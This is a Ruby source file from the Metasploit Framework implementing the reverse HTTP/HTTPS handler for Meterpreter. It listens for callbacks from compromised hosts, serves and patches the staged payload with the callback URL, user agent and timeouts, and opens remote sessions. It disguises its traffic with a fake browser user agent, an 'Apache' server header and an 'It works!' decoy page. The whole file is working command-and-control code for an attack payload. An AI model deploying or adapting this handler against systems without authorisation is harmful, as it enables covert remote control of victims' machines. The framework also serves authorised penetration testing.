# -*- coding: binary -*-
require 'rex/io/stream_abstraction'
require 'rex/sync/ref'

module Msf
module Handler

###
#
# This handler implements the HTTP SSL tunneling interface.
#
###
module ReverseHttp

	include Msf::Handler

	#
	# Returns the string representation of the handler type
	#
	def self.handler_type
		return "reverse_http"
	end

	#
	# Returns the connection-described general handler type, in this case
	# 'tunnel'.
	#
	def self.general_handler_type
		"tunnel"
	end

	#
	# Define 8-bit checksums for matching URLs
	# These are based on charset frequency
	#
	URI_CHECKSUM_INITW = 92
	URI_CHECKSUM_INITJ = 88
	URI_CHECKSUM_CONN  = 98

	#
	# Precalculated checkums as fallback
	#
	URI_CHECKSUM_PRECALC = [
		"Zjjaq", "pIlfv", "UvoxP", "sqnx9", "zvoVO", "Pajqy", "7ziuw", "vecYp", "yfHsn", "YLzzp",
		"cEzvr", "abmri", "9tvwr", "vTarp", "ocrgc", "mZcyl", "xfcje", "nihqa", "40F17", "zzTWt",
		"E3192", "wygVh", "pbqij", "rxdVs", "ajtsf", "wvuOh", "hwRwr", "pUots", "rvzoK", "vUwby",
		"tLzyk", "zxbuV", "niaoy", "ukxtU", "vznoU", "zuxyC", "ymvag", "Jxtxw", "404KC", "DE563",
		"0A7G9", "yorYv", "zzuqP", "czhwo", "949N8", "a1560", "5A2S3", "Q652A", "KR201", "uixtg",
		"U0K02", "4EO56", "H88H4", "5M8E6", "zudkx", "ywlsh", "luqmy", "09S4I", "L0GG0", "V916E",
		"KFI11", "A4BN8", "C3E2Q", "UN804", "E75HG", "622eB", "1OZ71", "kynyx", "0RE7F", "F8CR2",
		"1Q2EM", "txzjw", "5KD1S", "GLR40", "11BbD", "MR8B2", "X4V55", "W994P", "13d2T", "6J4AZ",
		"HD2EM", "766bL", "8S4MF", "MBX39", "UJI57", "eIA51", "9CZN2", "WH6AA", "a6BF9", "8B1Gg",
		"J2N6Z", "144Kw", "7E37v", "9I7RR", "PE6MF", "K0c4M", "LR3IF", "38p3S", "39ab3", "O0dO1",
		"k8H8A", "0Fz3B", "o1PE1", "h7OI0", "C1COb", "bMC6A", "8fU4C", "3IMSO", "8DbFH", "2YfG5",
		"bEQ1E", "MU6NI", "UCENE", "WBc0E", "T1ATX", "tBL0A", "UGPV2", "j3CLI", "7FXp1", "yN07I",
		"YE6k9", "KTMHE", "a7VBJ", "0Uq3R", "70Ebn", "H2PqB", "83edJ", "0w5q2", "72djI", "wA5CQ",
		"KF0Ix", "i7AZH", "M9tU5", "Hs3RE", "F9m1i", "7ecBF", "zS31W", "lUe21", "IvCS5", "j97nC",
		"CNtR5", "1g8gV", "7KwNG", "DB7hj", "ORFr7", "GCnUD", "K58jp", "5lKo8", "GPIdP", "oMIFJ",
		"2xYb1", "LQQPY", "FGQlN", "l5COf", "dA3Tn", "v9RWC", "VuAGI", "3vIr9", "aO3zA", "CIfx5",
		"Gk6Uc", "pxL94", "rKYJB", "TXAFp", "XEOGq", "aBOiJ", "qp6EJ", "YGbq4", "dR8Rh", "g0SVi",
		"iMr6L", "HMaIl", "yOY1Z", "UXr5Y", "PJdz6", "OQdt7", "EmZ1s", "aLIVe", "cIeo2", "mTTNP",
		"eVKy5", "hf5Co", "gFHzG", "VhTWN", "DvAWf", "RgFJp", "MoaXE", "Mrq4W", "hRQAp", "hAzYA",
		"oOSWV", "UKMme", "oP0Zw", "Mxd6b", "RsRCh", "dlk7Q", "YU6zf", "VPDjq", "ygERO", "dZZcL",
		"dq5qM", "LITku", "AZIxn", "bVwPL", "jGvZK", "XayKP", "rTYVY", "Vo2ph", "dwJYR", "rLTlS",
		"BmsfJ", "Dyv1o", "j9Hvs", "w0wVa", "iDnBy", "uKEgk", "uosI8", "2yjuO", "HiOue", "qYi4t",
		"7nalj", "ENekz", "rxca0", "rrePF", "cXmtD", "Xlr2y", "S7uxk", "wJqaP", "KmYyZ", "cPryG",
		"kYcwH", "FtDut", "xm1em", "IaymY", "fr6ew", "ixDSs", "YigPs", "PqwBs", "y2rkf", "vwaTM",
		"aq7wp", "fzc4z", "AyzmQ", "epJbr", "culLd", "CVtnz", "tPjPx", "nfry8", "Nkpif", "8kuzg",
		"zXvz8", "oVQly", "1vpnw", "jqaYh", "2tztj", "4tslx"
	]

	#
	# Use the +refname+ to determine whether this handler uses SSL or not
	#
	def ssl?
		!!(self.refname.index("https"))
	end

	#
	# Return a URI of the form scheme://host:port/
	#
	# Scheme is one of http or https and host is properly wrapped in [] for ipv6
	# addresses.
	#
	def full_uri
		lhost = datastore['LHOST']
		if lhost.empty? or lhost == "0.0.0.0" or lhost == "::"
			lhost = Rex::Socket.source_address
		end
		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
		scheme = (ssl?) ? "https" : "http"
		uri = "#{scheme}://#{lhost}:#{datastore["LPORT"]}/"

		uri
	end

	#
	# Map "random" URIs to static strings, allowing us to randomize
	# the URI sent in the first request.
	#
	def process_uri_resource(uri_match)

		# This allows 'random' strings to be used as markers for
		# the INIT and CONN request types, based on a checksum
		uri_strip, uri_conn = uri_match.split('_', 2)
		uri_strip.sub!(/^\//, '')

		# checksum8 fails if uri_strip is ""
		if uri_strip == ""
			return uri_match
		end

		uri_check = Rex::Text.checksum8(uri_strip)

		# Match specific checksums and map them to static URIs
		case uri_check
		when URI_CHECKSUM_INITW
			uri_match = "/INITM"
		when URI_CHECKSUM_INITJ
			uri_match = "/INITJM"
		when URI_CHECKSUM_CONN
			uri_match = "/CONN_" + ( uri_conn || Rex::Text.rand_text_alphanumeric(16) )
		end

		uri_match
	end

	#
	# Create a URI that matches a given checksum
	#
	def generate_uri_checksum(sum)
		chk = ("a".."z").to_a + ("A".."Z").to_a + ("0".."9").to_a
		32.times do
			uri = Rex::Text.rand_text_alphanumeric(3)
			chk.sort_by {rand}.each do |x|
				return(uri + x) if Rex::Text.checksum8(uri + x) == sum
			end
		end

		# Otherwise return one of the pre-calculated strings
		return URI_CHECKSUM_PRECALC[sum]
	end

	#
	# Initializes the HTTP SSL tunneling handler.
	#
	def initialize(info = {})
		super

		register_options(
			[
				OptString.new('LHOST', [ true, "The local listener hostname" ]),
				OptPort.new('LPORT', [ true, "The local listener port", 8080 ])
			], Msf::Handler::ReverseHttp)

		register_advanced_options(
			[
				OptString.new('ReverseListenerComm', [ false, 'The specific communication channel to use for this listener']),
				OptInt.new('SessionExpirationTimeout', [ false, 'The number of seconds before this session should be forcibly shut down', (24*3600*7)]),
				OptInt.new('SessionCommunicationTimeout', [ false, 'The number of seconds of no activity before this session should be killed', 300]),
				OptString.new('MeterpreterUserAgent', [ false, 'The user-agent that the payload should use for communication', 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)' ]),
				OptString.new('MeterpreterServerName', [ false, 'The server header that the handler will send in response to requests', 'Apache' ]),
				OptAddress.new('ReverseListenerBindAddress', [ false, 'The specific IP address to bind to on the local system']),
				OptString.new('HttpUnknownRequestResponse', [ false, 'The returned HTML response body when the handler receives a request that is not from a payload', '<html><body><h1>It works!</h1></body></html>'  ])
			], Msf::Handler::ReverseHttp)
	end

	#
	# Toggle for IPv4 vs IPv6 mode
	#
	def ipv6
		self.refname.index('ipv6') ? true : false
	end

	#
	# Create an HTTP listener
	#
	def setup_handler

		comm = datastore['ReverseListenerComm']
		if (comm.to_s == "local")
			comm = ::Rex::Socket::Comm::Local
		else
			comm = nil
		end

		# Determine where to bind the HTTP(S) server to
		bindaddrs = ipv6 ? '::' : '0.0.0.0'

		if not datastore['ReverseListenerBindAddress'].to_s.empty?
			bindaddrs = datastore['ReverseListenerBindAddress']
		end

		# Start the HTTPS server service on this host/port
		self.service = Rex::ServiceManager.start(Rex::Proto::Http::Server,
			datastore['LPORT'].to_i,
			bindaddrs,
			ssl?,
			{
				'Msf'        => framework,
				'MsfExploit' => self,
			},
			comm,
			(ssl?) ? datastore["SSLCert"] : nil
		)

		self.service.server_name = datastore['MeterpreterServerName']

		# Create a reference to ourselves
		obj = self

		# Add the new resource
		service.add_resource("/",
			'Proc' => Proc.new { |cli, req|
				on_request(cli, req, obj)
			},
			'VirtualDirectory' => true)

		print_status("Started HTTP#{ssl? ? "S" : ""} reverse handler on #{full_uri}")
	end

	#
	# Simply calls stop handler to ensure that things are cool.
	#
	def cleanup_handler
		stop_handler
	end

	#
	# Basically does nothing.  The service is already started and listening
	# during set up.
	#
	def start_handler
	end

	#
	# Removes the / handler, possibly stopping the service if no sessions are
	# active on sub-urls.
	#
	def stop_handler
		self.service.remove_resource("/") if self.service
	end

	attr_accessor :service # :nodoc:

protected

	#
	# Parses the HTTPS request
	#
	def on_request(cli, req, obj)
		sid  = nil
		resp = Rex::Proto::Http::Response.new

		print_status("#{cli.peerhost}:#{cli.peerport} Request received for #{req.relative_resource}...")

		uri_match = process_uri_resource(req.relative_resource)

		# Process the requested resource.
		case uri_match
			when /^\/INITJM/
				conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
				url = full_uri + conn_id + "/\x00"

				blob = ""
				blob << obj.generate_stage

				# This is a TLV packet - I guess somewhere there should be API for building them
				# in Metasploit :-)
				packet = ""
				packet << ["core_switch_url\x00".length + 8, 0x10001].pack('NN') + "core_switch_url\x00"
				packet << [url.length+8, 0x1000a].pack('NN')+url
				packet << [12, 0x2000b, datastore['SessionExpirationTimeout'].to_i].pack('NNN')
				packet << [12, 0x20019, datastore['SessionCommunicationTimeout'].to_i].pack('NNN')
				blob << [packet.length+8, 0].pack('NN') + packet

				resp.body = blob

				# Short-circuit the payload's handle_connection processing for create_session
				create_session(cli, {
					:passive_dispatcher => obj.service,
					:conn_id            => conn_id,
					:url                => url,
					:expiration         => datastore['SessionExpirationTimeout'].to_i,
					:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
					:ssl                => ssl?
				})

			when /^\/A?INITM?/

				url = ''

				print_status("#{cli.peerhost}:#{cli.peerport} Staging connection for target #{req.relative_resource} received...")
				resp['Content-Type'] = 'application/octet-stream'

				blob = obj.stage_payload

				# Replace the user agent string with our option
				i = blob.index("METERPRETER_UA\x00")
				if i
					str = datastore['MeterpreterUserAgent'][0,255] + "\x00"
					blob[i, str.length] = str
					print_status("Patched user-agent at offset #{i}...")
				end

				# Replace the transport string first (TRANSPORT_SOCKET_SSL)
				i = blob.index("METERPRETER_TRANSPORT_SSL")
				if i
					str = "METERPRETER_TRANSPORT_HTTP#{ssl? ? "S" : ""}\x00"
					blob[i, str.length] = str
				end
				print_status("Patched transport at offset #{i}...")

				conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
				i = blob.index("https://" + ("X" * 256))
				if i
					url = full_uri + conn_id + "/\x00"
					blob[i, url.length] = url
				end
				print_status("Patched URL at offset #{i}...")

				i = blob.index([0xb64be661].pack("V"))
				if i
					str = [ datastore['SessionExpirationTimeout'] ].pack("V")
					blob[i, str.length] = str
				end
				print_status("Patched Expiration Timeout at offset #{i}...")

				i = blob.index([0xaf79257f].pack("V"))
				if i
					str = [ datastore['SessionCommunicationTimeout'] ].pack("V")
					blob[i, str.length] = str
				end
				print_status("Patched Communication Timeout at offset #{i}...")

				resp.body = blob

				# Short-circuit the payload's handle_connection processing for create_session
				create_session(cli, {
					:passive_dispatcher => obj.service,
					:conn_id            => conn_id,
					:url                => url,
					:expiration         => datastore['SessionExpirationTimeout'].to_i,
					:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
					:ssl                => ssl?,
				})

			when /^\/CONN_.*\//
				resp.body = ""
				# Grab the checksummed version of CONN from the payload's request.
				conn_id = req.relative_resource.gsub("/", "")

				print_status("Incoming orphaned session #{conn_id}, reattaching...")

				# Short-circuit the payload's handle_connection processing for create_session
				create_session(cli, {
					:passive_dispatcher => obj.service,
					:conn_id            => conn_id,
					:url                => full_uri + conn_id + "/\x00",
					:expiration         => datastore['SessionExpirationTimeout'].to_i,
					:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
					:ssl                => ssl?,
				})

			else
				print_status("#{cli.peerhost}:#{cli.peerport} Unknown request to #{uri_match} #{req.inspect}...")
				resp.code    = 200
				resp.message = "OK"
				resp.body    = datastore['HttpUnknownRequestResponse'].to_s
		end

		cli.send_response(resp) if (resp)

		# Force this socket to be closed
		obj.service.close_client( cli )
	end


end

end
end

